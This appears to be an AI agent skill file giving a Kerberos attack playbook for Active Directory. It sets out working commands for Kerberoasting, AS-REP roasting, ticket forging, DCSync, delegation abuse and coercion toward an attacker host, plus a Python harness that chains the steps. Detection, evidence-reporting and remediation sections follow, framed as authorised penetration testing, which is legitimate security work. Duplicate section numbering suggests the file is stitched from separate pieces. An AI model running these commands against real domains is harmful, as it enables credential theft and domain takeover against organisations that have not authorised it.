---
name: kerberos-attacks
description: Kerberos protocol attack techniques and exploitation
tags: [kerberos, ad, windows, tickets]
version: "1.0"
---

# Kerberos Attack Techniques

## Kerberos Authentication Flow

```
Client                    KDC (DC)                   Service
   │                         │                          │
   │──AS-REQ (username)─────>│                          │
   │<─AS-REP (TGT)───────────│                          │
   │                         │                          │
   │──TGS-REQ (TGT, SPN)────>│                          │
   │<─TGS-REP (TGS)──────────│                          │
   │                         │                          │
   │──AP-REQ (TGS)──────────────────────────────────────>│
   │<─AP-REP────────────────────────────────────────────│
```

## Attack Categories

### 1. Kerberoasting

Request TGS tickets for service accounts and crack offline.

```bash
# Impacket - GetUserSPNs
GetUserSPNs.py domain.local/user:pass -dc-ip 10.0.0.1 -request

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt

# NetExec
nxc ldap 10.0.0.1 -u user -p pass --kerberoasting kerberoast.txt

# Targeting specific user
GetUserSPNs.py domain.local/user:pass -dc-ip 10.0.0.1 -request-user svc_sql
```

**Crack Hashes:**

```bash
# Hashcat
hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule

# John
john --format=krb5tgs hashes.txt --wordlist=wordlist.txt
```

### 2. AS-REP Roasting

Attack accounts with "Do not require Kerberos preauthentication" enabled.

```bash
# Find vulnerable users
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.0.0.1 -format hashcat

# With credentials (query LDAP)
GetNPUsers.py domain.local/user:pass -dc-ip 10.0.0.1 -request

# Rubeus (Windows)
Rubeus.exe asreproast /outfile:asrep.txt

# NetExec
nxc ldap 10.0.0.1 -u user -p pass --asreproast asrep.txt
```

**Crack Hashes:**

```bash
# Hashcat
hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule
```

### 3. Pass-the-Ticket (PtT)

Inject stolen Kerberos tickets into session.

```bash
# Export tickets (Mimikatz)
sekurlsa::tickets /export

# Inject ticket (Mimikatz)
kerberos::ptt ticket.kirbi

# Rubeus inject
Rubeus.exe ptt /ticket:base64_ticket

# Linux - export ticket
export KRB5CCNAME=/path/to/ticket.ccache

# Convert kirbi to ccache
ticketConverter.py ticket.kirbi ticket.ccache
```

### 4. Overpass-the-Hash (Pass-the-Key)

Request TGT using NTLM hash instead of password.

```bash
# Rubeus
Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt

# Impacket
getTGT.py domain.local/admin -hashes :NTLM_HASH

# With AES key
getTGT.py domain.local/admin -aesKey AES_KEY
```

### 5. Golden Ticket

Forge TGT using KRBTGT hash (requires domain compromise).

```bash
# Get KRBTGT hash (DCSync)
secretsdump.py domain.local/admin@10.0.0.1 -just-dc-user krbtgt

# Create Golden Ticket (Mimikatz)
kerberos::golden /user:fakeadmin /domain:domain.local \
  /sid:S-1-5-21-DOMAIN-SID /krbtgt:KRBTGT_HASH /ptt

# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-DOMAIN-SID \
  -domain domain.local fakeadmin

# Use ticket
export KRB5CCNAME=fakeadmin.ccache
psexec.py domain.local/fakeadmin@dc01 -k -no-pass
```

### 6. Silver Ticket

Forge TGS for specific service using service account hash.

```bash
# Get service account hash
secretsdump.py domain.local/admin@10.0.0.1 -just-dc-user svc_sql$

# Create Silver Ticket for CIFS (Mimikatz)
kerberos::golden /user:fakeadmin /domain:domain.local \
  /sid:S-1-5-21-DOMAIN-SID /target:server.domain.local \
  /service:cifs /rc4:SERVICE_NTLM /ptt

# Impacket - Silver ticket for MSSQL
ticketer.py -nthash SERVICE_NTLM -domain-sid S-1-5-21-DOMAIN-SID \
  -domain domain.local -spn MSSQLSvc/sql01.domain.local:1433 admin
```

**Common Service SPNs:**
| Service | SPN |
|---------|-----|
| SMB/CIFS | cifs/hostname |
| MSSQL | MSSQLSvc/hostname:1433 |
| HTTP | http/hostname |
| LDAP | ldap/hostname |
| HOST | host/hostname |

### 7. Diamond Ticket

Modify legitimate TGT (harder to detect than Golden Ticket).

```bash
# Rubeus (requires KRBTGT AES key)
Rubeus.exe diamond /krbkey:AES256_KEY /user:user /password:pass \
  /enctype:aes /ticketuser:fakeadmin /ticketuserid:500 /groups:512 /ptt
```

### 8. Delegation Attacks

#### Unconstrained Delegation

```bash
# Find unconstrained delegation computers
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# Coerce authentication (PrinterBug)
SpoolSample.exe dc01.domain.local attacker.domain.local

# Capture and use TGT
Rubeus.exe monitor /interval:1
Rubeus.exe ptt /ticket:base64_tgt
```

#### Constrained Delegation

```bash
# S4U2Self + S4U2Proxy
getST.py -spn cifs/target.domain.local domain.local/svc_constrained:pass \
  -impersonate administrator

# Rubeus
Rubeus.exe s4u /user:svc_constrained /rc4:HASH \
  /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

#### Resource-Based Constrained Delegation (RBCD)

```bash
# Add computer account
addcomputer.py domain.local/user:pass -method LDAPS -computer-name FAKE$ -computer-pass Pass123

# Set msDS-AllowedToActOnBehalfOfOtherIdentity
rbcd.py -delegate-to TARGET$ -delegate-from FAKE$ -dc-ip 10.0.0.1 domain.local/user:pass

# Get ticket
getST.py -spn cifs/target.domain.local domain.local/FAKE$:Pass123 -impersonate administrator

# Use ticket
export KRB5CCNAME=administrator.ccache
smbexec.py domain.local/administrator@target.domain.local -k -no-pass
```

### 9. Kerberos Relay

Relay Kerberos authentication (KrbRelayUp, KrbRelay).

```bash
# KrbRelayUp (local privilege escalation)
KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount \
  -ComputerName YOURCOMPUTER$ -ComputerPassword Password123

# Then use RBCD to escalate
```

## Encryption Types

| etype     | Algorithm  | Strength         |
| --------- | ---------- | ---------------- |
| 0x17 (23) | RC4-HMAC   | Weak (NTLM hash) |
| 0x11 (17) | AES128-CTS | Strong           |
| 0x12 (18) | AES256-CTS | Strongest        |

## Ticket Fields

| Field      | Description            |
| ---------- | ---------------------- |
| cname      | Client principal name  |
| crealm     | Client realm           |
| sname      | Service principal name |
| srealm     | Service realm          |
| enc-part   | Encrypted ticket data  |
| authtime   | Authentication time    |
| starttime  | Ticket valid from      |
| endtime    | Ticket expires         |
| renew-till | Renewal expiration     |

## Detection Indicators

| Attack            | Event ID | Indicator                  |
| ----------------- | -------- | -------------------------- |
| Kerberoasting     | 4769     | RC4 ticket requests        |
| AS-REP Roast      | 4768     | Pre-auth disabled accounts |
| Golden Ticket     | 4769     | Non-existent users         |
| Silver Ticket     | N/A      | Direct service access      |
| Overpass-the-Hash | 4768     | NTLM in AS-REQ             |
| DCSync            | 4662     | DS-Replication-Get-Changes |

---

## 9. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the **service ticket or hash come back** from the DC for the principal you targeted? | the protocol weakness exists on this domain |
| 2 | Did the **hash crack**, or did the ticket **authenticate** as the target? | the weakness is exploitable, not merely present |
| 3 | For a forged ticket: did the DC **accept it** and what did it grant? | forging works, and the impact |
| 4 | For delegation: did the impersonated service **accept the ticket as another user**? | the delegation path is live |
| 5 | Did you **read something you should not have** as a result (a share, a DC sync, a service)? | impact, measured |
| 6 | Is the account **privileged or service-critical**? | the severity driver |
| 7 | Is the finding **reproducible with a freshly requested ticket**? | it is a domain weakness, not a cached artefact |

**A ticket that authenticates is the bar.** A hash that was requested but never cracked, or a ticket
that was forged but rejected by the KDC, is not an exploitable finding - state it as a hardening issue
with the exact stopping point.

---

## 10. EXECUTION PRIMITIVES

Kerberos findings are proven by **a ticket the KDC issued or accepted, and the access it granted**.
Every block below ends at an authenticated action, not at a hash file on disk.

### 10.1 Establish the domain and a working credential baseline

```bash
DC="dc01.corp.local"; DOM="corp.local"; U="testuser"; P='Password123!'; DCIP="10.0.0.10"
# the control: a normal authentication, so everything after has a known-good reference
nxc smb "$DCIP" -u "$U" -p "$P" -d "$DOM"
# and the KDC's own view of the domain
nxc ldap "$DCIP" -u "$U" -p "$P" -d "$DOM" --query "(objectClass=domain)" "name"
# clock skew matters: Kerberos rejects tickets outside 5 minutes
date -u; nxc smb "$DCIP" -u "$U" -p "$P" -d "$DOM" --generate-hosts-file /tmp/hosts 2>/dev/null | head -2
```

**Establish the working credential and the clock offset first.** Kerberos failures are most often
clock skew or a wrong realm, and diagnosing that after the fact wastes an engagement.

### 10.2 AS-REP roasting: request, then crack, then authenticate

```bash
# 1) enumerate the principals that do not require pre-authentication
impacket-GetNPUsers "$DOM/" -usersfile /tmp/users.txt -dc-ip "$DCIP" -format hashcat -outputfile /tmp/asrep.txt -no-pass
grep -c '\$krb5asrep\$' /tmp/asrep.txt
# 2) crack it - the mode matters, and the cracking is what proves exploitability
hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt --force -O
hashcat -m 18200 /tmp/asrep.txt --show | head -3
# 3) authenticate with the recovered password - this is the finding
nxc smb "$DCIP" -u 'RECOVERED_USER' -p 'RECOVERED_PASS' -d "$DOM"
```

**Step 3 is the finding.** A hash file with no crack, or a crack with no successful authentication, is
a configuration observation - report it as such, with the exact step that stopped.

### 10.3 Kerberoasting: request the TGS, crack it, use it

```bash
# 1) find accounts with an SPN and record the encryption type offered
impacket-GetUserSPNs "$DOM/$U:$P" -dc-ip "$DCIP" -request -outputfile /tmp/tgs.txt
grep -c '\$krb5tgs\$' /tmp/tgs.txt
# note whether the ticket is RC4 (etype 23) or AES - RC4 cracks dramatically faster
grep -oE '\$krb5tgs\$23|\$krb5tgs\$17|\$krb5tgs\$18' /tmp/tgs.txt | sort | uniq -c
# 2) crack
hashcat -m 13100 /tmp/tgs.txt /usr/share/wordlists/rockyou.txt -O      # RC4
hashcat -m 19700 /tmp/tgs.txt /usr/share/wordlists/rockyou.txt -O      # AES
# 3) prove the SPN account's access - the impact
nxc smb "$DCIP" -u 'SPN_ACCOUNT' -p 'CRACKED_PASS' -d "$DOM" --shares
```

**The share listing under the cracked account's identity is the impact.** A kerberoastable service
account with no access beyond what your own account has is a low-severity finding, and the report
must say so.

### 10.4 Forged tickets: forge, then prove the KDC accepts it

```bash
# golden ticket requires the krbtgt hash; obtain it via DCSync first (see 10.6)
KRBTGT_NT="PASTE_NT_HASH"; SID="S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX"
impacket-ticketer -nthash "$KRBTGT_NT" -domain-sid "$SID" -domain "$DOM" Administrator
export KRB5CCNAME=/tmp/Administrator.ccache
# the proof: the DC accepts the forged TGT and grants access
impacket-smbclient -k -no-pass "$DC.$DOM" -dc-ip "$DCIP" -c 'shares' 2>&1 | head -5
impacket-secretsdump -k -no-pass "$DC.$DOM" -just-dc-user krbtgt -dc-ip "$DCIP" | head -5
# and a silver ticket, which needs no DC interaction at all - prove it against the service directly
impacket-ticketer -nthash SERVICE_NT -domain-sid "$SID" -domain "$DOM" -spn cifs/server.$DOM Administrator
KRB5CCNAME=/tmp/Administrator.ccache impacket-smbclient -k -no-pass "server.$DOM" -c 'ls' 2>&1 | head -5
```

**`secretsdump` returning the krbtgt hash through a forged ticket is the closure of the loop.** A
forged ticket that the DC rejects means the krbtgt hash or the SID is wrong - verify the SID from the
domain rather than assuming it.

### 10.5 Delegation: coercion plus impersonation, chained

```bash
# unconstrained: enumerate, coerce, capture - each step observed
impacket-findDelegation "$DOM/$U:$P" -dc-ip "$DCIP"
# the capture requires a listener and a coercion; run the listener and record the arrival
impacket-ntlmrelayx -t ldap://"$DCIP" -smb2support --delegate-access -of /tmp/relay.out &
# trigger the coercion from the target's perspective, then confirm a TGT arrived
python3 PetitPotam.py -d "$DOM" -u "$U" -p "$P" "ATTACKER_IP" "$DCIP"
sleep 10; ls -la /tmp/*.ccache 2>/dev/null; grep -ci 'ticket' /tmp/relay.out
# RBCD: prove the delegation by using the ticket it produces, not by the ACL write alone
impacket-getST -spn cifs/"$TARGET.$DOM" -impersonate Administrator "$DOM/$CTRL_ACCT:pass" -dc-ip "$DCIP"
KRB5CCNAME=Administrator@cifs_$TARGET.ccache impacket-smbclient -k -no-pass "$TARGET.$DOM" -c 'whoami' 2>&1 | head -3
```

**For RBCD the ACL write is not the finding; the `getST` and the resulting impersonated access is.**
A delegation attribute you can write, with no service you can reach, is a hardening observation.

### 10.6 DCSync and the credential material

```bash
# the proof is the replication, observed from the request side
impacket-secretsdump "$DOM/$U:$P@$DC" -just-dc-ntlm -dc-ip "$DCIP" -outputfile /tmp/dcsync.txt
grep -cE '^[A-Za-z0-9_\-]+:[0-9]+:[a-f0-9]{32}:[a-f0-9]{32}' /tmp/dcsync.txt
head -3 /tmp/dcsync.txt | sed 's/:[a-f0-9]\{32\}:/:<REDACTED>:/g'
# and which account enabled it - the ACE that made this possible belongs in the report
nxc ldap "$DCIP" -u "$U" -p "$P" -d "$DOM" --query "(objectClass=*)" "" 2>/dev/null | head -1
impacket-dacledit -action read -target-dn "DC=$DOM,DC=local" "$DOM/$U:$P" -dc-ip "$DCIP" 2>&1 | grep -iE 'replicat' | head -5
```

**The `DCSync` rights ACE on the account you used is part of the finding**, because it names the fix
location. Do not reproduce recovered hashes in the report - redact and reference the artefact.

### 10.7 Pass-the-ticket and overpass-the-hash, verified by an authenticated action

```bash
# convert and inject, then perform an action that requires the new identity
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=$PWD/ticket.ccache
impacket-smbclient -k -no-pass "$TARGET.$DOM" -c 'whoami; shares' 2>&1 | head -6
# overpass: derive a TGT from the NT hash, then use it
impacket-getTGT "$DOM/USER" -hashes ":NT_HASH" -dc-ip "$DCIP"
KRB5CCNAME=USER.ccache nxc smb "$DCIP" -k --use-kcache -d "$DOM" 2>&1 | head -3
```

**The authenticated action is the evidence.** A `.ccache` file with no successful use proves nothing;
record the command whose output shows the impersonated identity.

### 10.8 A stopped-on-first-failure harness

```bash
python3 - <<'PY'
import subprocess, re
DC="10.0.0.10"; DOM="corp.local"; U="testuser"; P="Password123!"
steps=[("baseline",   ["nxc","smb",DC,"-u",U,"-p",P,"-d",DOM]),
       ("asreproast", ["impacket-GetNPUsers",f"{DOM}/","-usersfile","/tmp/users.txt","-dc-ip",DC,"-no-pass","-format","hashcat"]),
       ("kerberoast", ["impacket-GetUserSPNs",f"{DOM}/{U}:{P}","-dc-ip",DC,"-request"]),
       ("delegation", ["impacket-findDelegation",f"{DOM}/{U}:{P}","-dc-ip",DC])]
results={}
for name,cmd in steps:
    try:
        r=subprocess.run(cmd,capture_output=True,text=True,timeout=120)
        out=r.stdout+r.stderr
        hit = bool(re.search(r'\$krb5asrep\$|\$krb5tgs\$|Delegation|Administrator',out))
        results[name]=(r.returncode,hit,len(out))
    except Exception as e:
        results[name]=("ERR",False,len(str(e)))
    print(f"{name:12} rc={results[name][0]} evidence={results[name][1]} out={results[name][2]}")
print()
print("Stop at the FIRST step with evidence, and report that step with its raw output.")
print("A step that returned rc=0 with no evidence is not a finding.")
PY
```

**Stop at the first step with evidence.** Reporting a full domain takeover when only step 2 produced
output is the fabrication this package exists to prevent.

---

## 11. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **domain, DC, and the credential level used** | the finding is scoped to a trust boundary |
| The **exact command and its raw output** for each step that worked | reproducibility |
| For a roast: the **ticket or hash artefact**, and the **crack result** | presence and exploitability, separately |
| For a roast: the **encryption type** offered (RC4 vs AES) | it determines the realistic crack time and the fix |
| For a forged ticket: the **krbtgt or service hash's provenance** and the **authenticated action** | the loop closed |
| For delegation: the **attribute or ACE that enabled it** and the **impersonated access** | cause and effect |
| For DCSync: the **replicating ACE** on the account used, redacted hashes | the fix location |
| **Negative control** - the same action with the unprivileged baseline credential fails | shows the access was gained, not held |
| The **detection artefact** the activity would produce (4769, 4662, 4624 type 3) | the blue-team half of the report |
| Confirmation that no **persistence mechanism was left behind** unless authorised | scope discipline |

Report the **ticket and the access it bought**: "`GetUserSPNs` against `dc01.corp.local` returned a
Kerberos service ticket for `svc_sql` with etype 23 (RC4-HMAC) for SPN `MSSQLSvc/sql01.corp.local:1433`;
hashcat mode 13100 recovered the password in 4 minutes; authenticating as `svc_sql` with
`nxc smb 10.0.0.10 --shares` listed `SYSVOL`, `NETLOGON`, and `SQLBackups`, the last readable and
containing 14 database backups; the account is not a Domain Admin, so the impact is the backup data,
not domain control", never "the domain is vulnerable to Kerberoasting".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A roastable account whose hash **does not crack** | a strong password defeats the attack; report as hardening |
| A hash that cracked but **the account is disabled** | verify the account is live before claiming impact |
| A kerberoastable account with **no access beyond your own** | low severity; say so explicitly |
| A forged ticket the **KDC rejects** | the key material or SID is wrong |
| AES-only tickets you did not crack | state the etype, do not imply it was cracked |
| A delegation attribute you can write with **no reachable service** | hardening, not exploitation |
| An ACL you can modify but **no path to a privileged object** | verify the path with BloodHound first |
| A DCSync right held by a **service account you already control** | not an escalation |
| `BloodHound` output alone | a path is a hypothesis until you walk it |
| Access gained with a **Domain Admin credential you were already given** | the engagement scope, not a finding |
| A finding on a **test domain** you stood up yourself | tests your own build |
| A recovered hash reproduced in full in the report | a disclosure, not evidence |

**Walk the path.** BloodHound shows you a route; the finding is the authenticated action at the end
of it, captured.

---

## 12. REMEDIATION REFERENCE

1. **Move service accounts off RC4 and onto AES-only, and disable RC4 for the domain** - it removes the fast offline crack and forces a meaningfully longer key, so the Kerberoasting economics change.
2. **Give service accounts 25+ character managed passwords rotated automatically** - gMSAs are the mechanism; a crackable service password is the root cause of both roasting families.
3. **Require Kerberos pre-authentication for every account** - AS-REP roasting is entirely the absence of this flag, so the fix is one attribute per account.
4. **Rotate the `krbtgt` password twice, with the maximum ticket lifetime between the rotations** - it invalidates every forged golden ticket, and it must be done twice because the previous key remains valid for the ticket lifetime.
5. **Restrict `DCSync` replication rights to the DCs themselves** - any other holder should be treated as a domain-controller-equivalent account and removed or heavily guarded.
6. **Audit and remove unnecessary delegation, especially unconstrained** - an unconstrained-delegation host is a domain compromise waiting for a coercion primitive.
7. **Enable and enforce the `Protected Users` group for all privileged accounts** - it removes credential caching and delegation, which closes pass-the-hash and overpass-the-hash for those accounts.
8. **Disable NTLM where possible and enforce SMB signing and channel binding** - a large share of AD escalation depends on relay, and these three controls remove it.
9. **Prune ACLs on privileged objects to the minimum, and monitor ACE changes on them** - ACL-based escalation is a change to a security descriptor, and that change is auditable.
10. **Enable LAPS or Windows LAPS for all machine-local administrator accounts** - unique, rotated local passwords remove the re-used-credential path between workstations.
11. **Alert on the ticket-request patterns these attacks require** - 4769 with RC4 for a service account, 4768 without pre-auth, and 4662 replication are each high-signal and cheap to detect.

---

## 13. RELATED SIBLINGS - LOAD TOGETHER

- [ad-security](../ad-security/SKILL.md) - the broader AD testing methodology this refines
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) - the ACL paths that reach the same credentials
- [credential-access-atomic-tests](../credential-access-atomic-tests/SKILL.md) - the technique-level mapping for the credential access these attacks perform
- [hash-attack-techniques](../hash-attack-techniques/SKILL.md) - the cracking half of both roasting families
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) - the companion deep-dive on the same protocol
